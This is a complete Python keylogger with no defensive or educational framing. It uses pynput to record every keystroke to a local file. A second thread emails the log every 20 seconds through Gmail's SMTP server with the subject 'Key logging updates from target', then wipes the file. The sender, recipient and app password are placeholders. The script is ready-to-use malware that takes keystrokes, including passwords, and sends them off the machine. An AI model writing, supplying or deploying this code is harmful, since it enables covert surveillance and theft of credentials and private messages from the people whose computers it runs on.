import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import threading
import time
import os
from os.path import exists
from pynput import keyboard

log_file = 'l.txt'
file_exists = exists(log_file)
if not file_exists:
    f = open(log_file, "w")
else:
    f = open(log_file, "w")
    f.write("")


def on_key_press(key):
    try:
        st = str(key).replace("'", "")
        if st == "Key.esc":
            return False  # Stop the listener
        with open(log_file, 'a') as f:
            f.write(st + '\n')
    except Exception as e:
        print(f"Error in key logging: {e}")


def send_email(subject, body, to_email, from_email, password):
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(from_email, password)
        server.send_message(msg)
        # print('Email sent successfully!')
    except Exception as e:
        print(f'failed to send email: {e}')
    finally:
        server.quit()


def monitor_log_file():
    while True:
        time.sleep(20)  # as in seconds between emails.
        if os.path.getsize(log_file) > 0:
            with open(log_file, 'r') as f:
                log_content = f.read()

            send_email(
                subject='Key logging updates from target',
                body=log_content,
                to_email='RECIPIENT_GMAIL@gmail.com',  # Replace with your recipient email
                from_email='SENDER_GMAIL@gmail.com',  # Replace with your email
                password='APP_PASSWORD'  # Replace with your app password - https://support.google.com/accounts/answer/185833?visit_id=638586207562879682-2494561833&p=InvalidSecondFactor&rd=1
            )
            open(log_file, 'w').close()


def start_keylogger():
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()


keylogger_thread = threading.Thread(target=start_keylogger)
monitor_thread = threading.Thread(target=monitor_log_file)

keylogger_thread.start()
monitor_thread.start()

keylogger_thread.join()
monitor_thread.join()
